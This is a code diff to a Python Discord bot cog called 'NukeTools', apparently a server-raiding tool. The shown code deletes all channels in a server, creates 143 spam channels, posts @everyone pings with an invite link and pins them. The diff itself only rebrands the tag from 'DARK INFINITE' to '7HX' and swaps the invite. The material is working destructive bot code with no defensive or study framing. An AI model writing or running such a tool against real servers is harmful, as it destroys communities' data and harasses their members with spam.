@@ -1271,7 +1271,7 @@ class NukeTools(Cog, name="nuketools"):
         # Step 1: Delete all existing channels and categories
         for channel in list(guild.channels):
             try:
-                await channel.delete(reason="NUKED BY DARK INFINITE")
+                await channel.delete(reason="NUKED BY 7HX")
                 await asyncio.sleep(0.3)
             except Exception:
                 pass
@@ -1280,11 +1280,11 @@ class NukeTools(Cog, name="nuketools"):
         for i in range(143):
             try:
                 ch = await guild.create_text_channel(
-                    f"NUKED BY DARK INFINITE",
-                    reason="NUKED BY DARK INFINITE"
+                    f"NUKED BY 7HX",
+                    reason="NUKED BY 7HX"
                 )
                 # Send @everyone ping
-                msg = await ch.send(f" # NUKED BY DARK INFINITE  @everyone  https://discord.gg/Nr4B4gVfZ3")
+                msg = await ch.send(f" # NUKED BY 7HX  @everyone  https://discord.gg/pFUZsVQByK")
                 # Pin the message
                 try:
                     await msg.pin()
